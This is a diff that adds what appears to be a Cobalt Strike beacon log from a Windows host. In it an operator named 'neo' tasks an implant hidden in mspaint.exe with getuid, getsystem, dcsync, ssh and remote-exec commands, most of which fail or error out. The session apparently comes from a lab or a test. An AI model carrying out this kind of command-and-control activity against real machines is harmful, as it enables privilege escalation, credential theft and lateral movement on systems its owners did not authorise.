@@ -1,0 +1,34 @@
+01/06 06:43:31 UTC [metadata] 192.168.88.108 <- 192.168.88.108; computer: DESKTOP-29M090E; user: NITRO 5; process: mspaint.exe; pid: 8004; os: Windows; version: 10.0; build: 22621; beacon arch: x64 (x64)
+01/06 06:50:24 UTC [checkin] host called home, sent: 19 bytes
+01/06 06:54:43 UTC [input] <neo> sleep 5
+01/06 06:54:43 UTC [task] <T1029> Tasked beacon to sleep for 5s
+01/06 06:55:24 UTC [checkin] host called home, sent: 16 bytes
+01/06 06:56:59 UTC [checkin] host called home, sent: 26 bytes
+01/06 06:57:04 UTC [checkin] host called home, sent: 20 bytes
+01/06 07:01:46 UTC [input] <neo> dcsync
+01/06 07:01:46 UTC [error] dcsync error: not enough arguments
+01/06 07:02:01 UTC [input] <neo> getuid
+01/06 07:02:01 UTC [task] <> Tasked beacon to get userid
+01/06 07:02:05 UTC [checkin] host called home, sent: 8 bytes
+01/06 07:02:05 UTC [output]
+You are DESKTOP-29M090E\NITRO 5
+
+01/06 07:02:16 UTC [input] <neo> getsystem
+01/06 07:02:16 UTC [task] <T1134> Tasked beacon to get SYSTEM
+01/06 07:02:20 UTC [checkin] host called home, sent: 2743 bytes
+01/06 07:02:20 UTC [output]
+received output:
+getsystem failed.
+
+01/06 07:02:39 UTC [input] <neo> ssh
+01/06 07:02:39 UTC [error] ssh error: not enough arguments
+01/06 07:02:45 UTC [input] <neo> ssh-key
+01/06 07:02:45 UTC [error] ssh-key error: not enough arguments
+01/06 07:03:25 UTC [input] <neo> remote-exec winrm
+01/06 07:03:25 UTC [error] remote-exec error: not enough arguments
+01/06 07:24:23 UTC [input] <neo> powershell 2+2
+01/06 07:24:23 UTC [task] <T1086> Tasked beacon to run: 2+2
+01/06 07:24:23 UTC [checkin] host called home, sent: 79 bytes
+01/06 07:24:23 UTC [output]
+beacon exit.
+
